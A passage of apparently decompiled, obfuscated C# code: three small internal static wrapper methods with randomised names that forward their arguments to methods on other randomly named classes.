	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static long tYGMnibQOOLvbbZ3VjY(decimal P_0, object P_1)
	{
		return s4ckl5xOT2F9OQsZ6RE.IrTxr5idK(P_0, (s4ckl5xOT2F9OQsZ6RE)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static object KF9RhPbYmS2BtMCEhRD(ulong P_0, object P_1)
	{
		return LphrfQx5x5xOG5Bwt4P.IrTxr5idK(P_0, (LphrfQx5x5xOG5Bwt4P)P_1);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	internal static ushort UJdlEpbahOe6MVPLvN0(decimal P_0, object P_1)
	{
		return IOHgf6x0ftNhqwwtsmQ.IrTxr5idK(P_0, (IOHgf6x0ftNhqwwtsmQ)P_1);
	}
}
